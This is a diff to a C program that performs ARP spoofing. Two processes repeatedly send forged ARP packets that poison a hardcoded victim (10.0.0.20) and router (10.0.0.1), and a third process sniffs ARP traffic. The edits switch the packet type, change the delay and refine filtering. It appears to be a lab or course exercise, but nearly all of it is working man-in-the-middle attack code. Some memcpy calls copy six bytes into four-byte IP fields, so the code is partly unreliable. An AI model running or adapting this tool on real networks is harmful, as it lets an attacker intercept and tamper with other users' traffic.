@@ -14,7 +14,7 @@
 #include <signal.h>
 #include "arp.h"
 
-#define SPOOFING_DELAY 1
+#define SPOOFING_DELAY 5
 #define ARP_OPERATION_REQUEST 1
 #define ARP_OPERATION_REPLY 2
 
@@ -24,6 +24,7 @@ uint8_t this_mac[6];
 uint8_t bcast_mac[6] =	{0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 uint8_t dst_mac[6] =	{0x00, 0x00, 0x00, 0x22, 0x22, 0x22};
 uint8_t src_mac[6] =	{0x00, 0x00, 0x00, 0xaa, 0x00, 0x02};
+uint8_t src_ip[4] = {0x0a, 0x00, 0x00, 0x15};
 
 uint8_t ROUTER_IP[4] = {0x0a, 0x00, 0x00, 0x01};
 uint8_t VICTIM_IP[4] = {0x0a, 0x00, 0x00, 0x14};
@@ -34,19 +35,18 @@ int *running;
 
 void HandleSignal(int signal)
 {
-	printf("\n");
 	*running = 0;
 }
 
-int CompareMac(uint8_t *mac1, uint8_t *mac2)
+int CompareVec(uint8_t *vec1, uint8_t *vec2, int size)
 {
 	int i;
-	for (i = 0; i < 6; i++)
+	for (i = 0; i < size; i++)
 	{
-		if (*mac1 != *mac2)
+		if (*vec1 != *vec2)
 			return 0;
-		mac1++;
-		mac2++;
+		vec1++;
+		vec2++;
 	}
 	return 1;
 }
@@ -100,7 +100,7 @@ void PopulateEthBuffer(union eth_buffer *buffer_u)
 	buffer_u->cooked_data.payload.arp.prot_type = htons(ETH_P_IP);
 	buffer_u->cooked_data.payload.arp.hlen = 6;
 	buffer_u->cooked_data.payload.arp.plen = 4;
-	buffer_u->cooked_data.payload.arp.operation = htons(ARP_OPERATION_REPLY);
+	buffer_u->cooked_data.payload.arp.operation = htons(ARP_OPERATION_REQUEST);
 }
 
 /* ARP Spoofing To Victim */
@@ -121,19 +121,19 @@ void P1()
 	memcpy(buffer_u.cooked_data.payload.arp.src_paddr, ROUTER_IP, 6);
 	memset(buffer_u.cooked_data.payload.arp.tgt_hwaddr, 0, 6);
 	memcpy(buffer_u.cooked_data.payload.arp.tgt_paddr, VICTIM_IP, 6);
-
+	//memcpy(socket_address.sll_addr, dst_mac, 6);	
+	
 	/* Send it.. */
 	while (*running)
 	{
-		memcpy(socket_address.sll_addr, dst_mac, 6);
 		if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
 			printf("P1 Send failed\n");
-		
+			
 		sleep(SPOOFING_DELAY);
 	}
 }
 
-/* ARP Spoofing To Victim */
+/* ARP Spoofing To Router */
 void P2()
 {
 	signal(SIGINT, HandleSignal);
@@ -150,14 +150,14 @@ void P2()
 	memcpy(buffer_u.cooked_data.payload.arp.src_hwaddr, src_mac, 6);
 	memcpy(buffer_u.cooked_data.payload.arp.src_paddr, VICTIM_IP, 6);
 	memset(buffer_u.cooked_data.payload.arp.tgt_hwaddr, 0, 6);
-	memcpy(buffer_u.cooked_data.payload.arp.tgt_paddr, ROUTER_IP, 6);
+	memcpy(buffer_u.cooked_data.payload.arp.tgt_paddr, ROUTER_IP, 6);	
+	//memcpy(socket_address.sll_addr, dst_mac, 6);
 
 	/* Send it.. */
 	while (*running)
-	{
-		memcpy(socket_address.sll_addr, dst_mac, 6);
+	{	
 		if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
-			printf("P1 Send failed\n");
+			printf("P2 Send failed\n");
 		
 		sleep(SPOOFING_DELAY);
 	}
@@ -188,9 +188,14 @@ void P3()
 	while (*running){
 		numbytes = recvfrom(sockfd, buffer_u.raw_data, ETH_LEN, 0, NULL, NULL);
 		
-		if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_ARP)){
+		if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_ARP)) {
 			/* do not print packets from P1 or P2 */
-			if (CompareMac(&buffer_u.cooked_data.payload.arp.src_hwaddr[0], &src_mac[0]))
+			if (CompareVec(&buffer_u.cooked_data.payload.arp.src_hwaddr[0], &src_mac[0], 6))
+				continue;
+				
+			if (buffer_u.cooked_data.payload.arp.operation == htons(ARP_OPERATION_REPLY) &&
+				(CompareVec(&buffer_u.cooked_data.payload.arp.src_paddr[0], VICTIM_IP, 4)
+				 || CompareVec(&buffer_u.cooked_data.payload.arp.src_paddr[0], ROUTER_IP, 4)))
 				continue;
 			
 			printf("******* ARP packet\n");
@@ -198,7 +203,7 @@ void P3()
 			printf("	Protocol Type: %d\n", buffer_u.cooked_data.payload.arp.prot_type);
 			printf("	HLEN: %d\n", buffer_u.cooked_data.payload.arp.hlen);
 			printf("	DLEN: %d\n", buffer_u.cooked_data.payload.arp.plen);
-			printf("	Operation: %d\n", buffer_u.cooked_data.payload.arp.operation);
+			printf("	Operation: %d\n", ntohs(buffer_u.cooked_data.payload.arp.operation));
 			
 			printf("	Sender HA: ");
 			for (i = 0; i < 5; i++)
